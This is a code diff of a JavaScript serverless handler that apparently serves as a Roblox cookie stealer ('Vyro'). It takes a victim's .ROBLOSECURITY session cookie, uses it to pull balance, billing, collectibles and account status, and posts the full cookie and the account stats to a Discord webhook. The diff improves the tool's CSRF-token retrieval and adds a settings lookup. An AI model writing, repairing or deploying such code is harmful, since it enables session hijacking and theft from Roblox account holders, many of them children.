@@ -3,8 +3,9 @@ const WEBHOOK_URL = process.env.WEBHOOK_URL || process.env.DISCORD_WEBHOOK_URL;
 
 // ---------- Helper: get CSRF token ----------
 async function getCsrfToken(cookie) {
-  // The /mobileapi/userinfo endpoint returns a CSRF token in its headers.
-  const res = await fetch("https://www.roblox.com/mobileapi/userinfo", {
+  // Roblox returns a CSRF token when you call this logout endpoint (even with GET)
+  const res = await fetch("https://auth.roblox.com/v2/logout", {
+    method: "GET",
     headers: { Cookie: `.ROBLOSECURITY=${cookie}` }
   });
   const csrfToken = res.headers.get("x-csrf-token");
@@ -23,7 +24,7 @@ function getAgeDays(createdDate) {
   return Math.floor((new Date() - new Date(createdDate)) / (1000 * 60 * 60 * 24));
 }
 
-// ---------- Robux balance (authenticated) ----------
+// ---------- Robux balance ----------
 async function getRobux(userId, cookie) {
   const res = await fetch(`https://economy.roblox.com/v1/users/${userId}/currency`, {
     headers: { Cookie: `.ROBLOSECURITY=${cookie}` }
@@ -33,42 +34,7 @@ async function getRobux(userId, cookie) {
   return { balance: data.robux || 0 };
 }
 
-// ---------- Groups (public) ----------
-async function getGroups(userId) {
-  try {
-    const res = await fetch(`https://groups.roblox.com/v2/users/${userId}/groups/roles`);
-    if (!res.ok) return { owned: 0, funds: 0 };
-    const data = await res.json();
-    const owned = data.data?.length || 0;
-    // Note: Summing 'funds' requires additional, expensive calls for each group.
-    return { owned, funds: 0 };
-  } catch (e) {
-    return { owned: 0, funds: 0 };
-  }
-}
-
-// ---------- Total Place Visits ----------
-async function getTotalPlaceVisits(userId) {
-  let totalVisits = 0;
-  let cursor = null;
-  do {
-    const url = `https://games.roblox.com/v2/users/${userId}/games?sortOrder=Asc&limit=50${cursor ? `&cursor=${cursor}` : ""}`;
-    const res = await fetch(url);
-    if (!res.ok) break;
-    const data = await res.json();
-    for (const game of data.data) {
-      const gameDetailsRes = await fetch(`https://games.roblox.com/v1/games?universeIds=${game.id}`);
-      if (gameDetailsRes.ok) {
-        const gameDetails = await gameDetailsRes.json();
-        totalVisits += gameDetails.data[0]?.placeVisits || 0;
-      }
-    }
-    cursor = data.nextPageCursor;
-  } while (cursor);
-  return totalVisits;
-}
-
-// ---------- Pending Robux (from transactions) ----------
+// ---------- Pending Robux (from sales/group payouts) ----------
 async function getPendingRobux(userId, cookie) {
   let pending = 0;
   try {
@@ -77,15 +43,38 @@ async function getPendingRobux(userId, cookie) {
     });
     if (!res.ok) return pending;
     const data = await res.json();
-    for (const transaction of data.data) {
-      if (transaction.transactionType === "Sale" || transaction.transactionType === "GroupPayout") {
-        pending += transaction.currency?.amount || 0;
+    for (const tx of data.data || []) {
+      if (tx.transactionType === "Sale" || tx.transactionType === "GroupPayout") {
+        pending += tx.currency?.amount || 0;
       }
     }
   } catch (e) {
-    console.warn("Failed to fetch pending Robux:", e);
+    console.warn("Pending Robux fetch error:", e);
   }
   return pending;
+}
+
+// ---------- User Settings (Verified, Banned, Email) from mobileapi ----------
+async function getUserSettings(cookie, csrfToken) {
+  const defaultSettings = { verified: "False", banned: "False", emailEnabled: "False" };
+  try {
+    const res = await fetch("https://www.roblox.com/mobileapi/userinfo", {
+      headers: {
+        Cookie: `.ROBLOSECURITY=${cookie}`,
+        "X-CSRF-TOKEN": csrfToken
+      }
+    });
+    if (!res.ok) return defaultSettings;
+    const data = await res.json();
+    return {
+      verified: data.IsVerified ? "True" : "False",
+      banned: data.IsBanned ? "True" : "False",
+      emailEnabled: data.Email ? "True" : "False"
+    };
+  } catch (e) {
+    console.warn("User settings fetch error:", e);
+    return defaultSettings;
+  }
 }
 
 // ---------- Billing (Credit, Convert, Card) ----------
@@ -109,28 +98,60 @@ async function getBilling(cookie, csrfToken) {
       card: hasCard ? "True" : "False"
     };
   } catch (e) {
-    console.error("Billing fetch error:", e);
+    console.warn("Billing fetch error:", e);
     return defaultBilling;
   }
 }
 
-// ---------- Collectibles (from inventory) ----------
+// ---------- Groups (count only) ----------
+async function getGroupsCount(userId) {
+  try {
+    const res = await fetch(`https://groups.roblox.com/v2/users/${userId}/groups/roles`);
+    if (!res.ok) return 0;
+    const data = await res.json();
+    return data.data?.length || 0;
+  } catch (e) {
+    return 0;
+  }
+}
+
+// ---------- Total Place Visits (sum over all universes) ----------
+async function getTotalPlaceVisits(userId) {
+  let totalVisits = 0;
+  let cursor = null;
+  do {
+    const url = `https://games.roblox.com/v2/users/${userId}/games?sortOrder=Asc&limit=50${cursor ? `&cursor=${cursor}` : ""}`;
+    const res = await fetch(url);
+    if (!res.ok) break;
+    const data = await res.json();
+    for (const game of data.data) {
+      const detailsRes = await fetch(`https://games.roblox.com/v1/games?universeIds=${game.id}`);
+      if (detailsRes.ok) {
+        const details = await detailsRes.json();
+        totalVisits += details.data[0]?.placeVisits || 0;
+      }
+    }
+    cursor = data.nextPageCursor;
+  } while (cursor);
+  return totalVisits;
+}
+
+// ---------- Collectibles (first 3 names) ----------
 async function getCollectibles(userId, cookie) {
-  let collectibles = [];
+  let items = [];
   let cursor = null;
   do {
     const url = `https://inventory.roblox.com/v1/users/${userId}/assets/collectibles?limit=100${cursor ? `&cursor=${cursor}` : ""}`;
     const res = await fetch(url, { headers: { Cookie: `.ROBLOSECURITY=${cookie}` } });
     if (!res.ok) break;
     const data = await res.json();
-    collectibles.push(...data.data);
+    items.push(...data.data);
     cursor = data.nextPageCursor;
   } while (cursor);
-  // Return the names of the first 3 collectibles for display
-  return collectibles.slice(0, 3).map(item => item.name);
+  return items.slice(0, 3).map(item => item.name);
 }
 
-// ---------- Recently Played Games ----------
+// ---------- Recently Played Games (for Played | Passes) ----------
 async function getRecentlyPlayedGames(userId) {
   const url = `https://games.roblox.com/v1/users/${userId}/games?sortOrder=Desc&limit=50`;
   const res = await fetch(url);
@@ -148,7 +169,7 @@ async function getPlayedPasses(userId) {
   });
 }
 
-// ---------- Country flag (unicode) ----------
+// ---------- Country flag from IP ----------
 async function getCountryFlag(req) {
   const ip = req.headers['x-forwarded-for']?.split(',')[0].trim() || req.socket.remoteAddress;
   if (!ip || ip === '::1') return '🏠 Local';
@@ -166,7 +187,7 @@ async function getCountryFlag(req) {
   return '🌍 Unknown';
 }
 
-// ---------- Avatar ----------
+// ---------- Avatar URL ----------
 async function getUserAvatarUrl(userId) {
   try {
     const res = await fetch(
@@ -191,31 +212,45 @@ export default async function handler(req, res) {
   if (!WEBHOOK_URL) return res.status(500).json({ error: "Missing WEBHOOK_URL env var" });
 
   try {
-    // Get CSRF token for protected endpoints
-    const csrfToken = await getCsrfToken(cookie);
-    
-    // Parallel fetch all data
-    const [userData, robux, groups, totalVisits, pendingRobux, billing, collectibles, playedPasses, countryFlag, avatarUrl] = await Promise.all([
+    // 1. Get CSRF token (required for settings & billing)
+    let csrfToken = null;
+    try {
+      csrfToken = await getCsrfToken(cookie);
+    } catch (e) {
+      console.warn("CSRF token fetch failed. Settings/Billing will use defaults.");
+    }
+
+    // 2. Fetch all data in parallel (some depend on csrfToken)
+    const [userData, robux, pendingRobux, groupsCount, totalVisits, collectibles, playedPasses, countryFlag, avatarUrl] = await Promise.all([
       getUser(rbxuid),
       getRobux(rbxuid, cookie),
-      getGroups(rbxuid),
-      getTotalPlaceVisits(rbxuid),
       getPendingRobux(rbxuid, cookie),
-      getBilling(cookie, csrfToken),
+      getGroupsCount(rbxuid),
+      getTotalPlaceVisits(rbxuid),
       getCollectibles(rbxuid, cookie),
       getPlayedPasses(rbxuid),
       getCountryFlag(req),
       getUserAvatarUrl(rbxuid)
     ]);
 
+    // 3. Settings & Billing (only if we have CSRF token)
+    let settings = { verified: "False", banned: "False", emailEnabled: "False" };
+    let billing = { credit: 0, convert: 0, card: "False" };
+    if (csrfToken) {
+      [settings, billing] = await Promise.all([
+        getUserSettings(cookie, csrfToken),
+        getBilling(cookie, csrfToken)
+      ]);
+    }
+
     const accountAge = getAgeDays(userData.created);
-    const summary = robux.balance + (pendingRobux); // Summary = Balance + Pending
+    const summary = robux.balance + pendingRobux; // Summary = Balance + Pending
     const playedPassesText = playedPasses.map(p => `${p.name} | ${p.played} | ${p.passes}`).join("\n");
     const rolimonsLink = `https://www.rolimons.com/player/${userData.id}`;
     const cookieThumb = "https://png.pngtree.com/png-vector/20201010/ourmid/pngtree-cartoon-delicious-dessert-cookie-cookie-clipart-png-image_2360164.jpg";
     const robuxEmoji = "<:Robux:1495081542370726080>";
 
-    // ---------- Embed 1: Stats ----------
+    // ---------- Stats Embed ----------
     const statsEmbed = {
       title: "🔱 Vyro Har - Result",
       description: `**Check_VYROSECURITY | Vyro**\n\`2400c5b00-465b-1000-bd8d8e8fca5bc723\``,
@@ -250,7 +285,7 @@ export default async function handler(req, res) {
         },
         {
           name: "📊 Settings",
-          value: `**(Verified)** ${userData.isVerified ? "True" : "False"}\n**Is Banned** ${userData.isBanned ? "True" : "False"}\n**Email Enabled** ${userData.hasEmail ? "True" : "False"}`,
+          value: `**(Verified)** ${settings.verified}\n**Is Banned** ${settings.banned}\n**Email Enabled** ${settings.emailEnabled}`,
           inline: true
         },
         {
@@ -260,7 +295,7 @@ export default async function handler(req, res) {
         },
         {
           name: "📊 Groups",
-          value: `**Owned:** ${groups.owned}`,
+          value: `**Owned:** ${groupsCount}`,
           inline: true
         },
         {
@@ -273,7 +308,7 @@ export default async function handler(req, res) {
       timestamp: new Date().toISOString()
     };
 
-    // ---------- Embed 2: .ROBLOSECURITY Cookie ----------
+    // ---------- Cookie Embed ----------
     const cookieEmbed = {
       title: "🍪 ***.ROBLOSECURITY***",
       description: `**Full Roblox Cookie:**\n\`\`\`\n${cookie}\n\`\`\``,
@@ -283,7 +318,7 @@ export default async function handler(req, res) {
       timestamp: new Date().toISOString()
     };
 
-    // Send both embeds
+    // Send to Discord
     await fetch(WEBHOOK_URL, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
